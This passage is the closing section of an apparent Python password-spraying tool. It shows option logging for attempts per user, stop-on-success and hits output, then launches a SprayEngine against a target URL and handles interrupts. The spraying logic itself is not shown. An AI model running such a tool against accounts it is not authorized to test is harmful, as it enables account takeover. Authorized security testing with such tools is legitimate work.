        log_info(f"Max attempts/user: {C.Y}{args.max_attempts}{C.X}")
    if args.stop_on_success:
        log_info(f"Stop-on-success: {C.Y}enabled{C.X}")
    if args.output:
        log_info(f"Hits file (-o): {C.Y}{args.output}{C.X}")
    if args.json_output:
        log_info(f"JSON (-j): {C.Y}{args.json_output}{C.X}")

    print()

    # ── Run ──
    engine = SprayEngine(args)
    engine.run(scanner, pairs, args.protocol, scanner.base_url())


def run_cli():
    try:
        main()
    except KeyboardInterrupt:
        print()
        log_warn("Interrupted by user")
        sys.exit(0)


if __name__ == "__main__":
    run_cli()
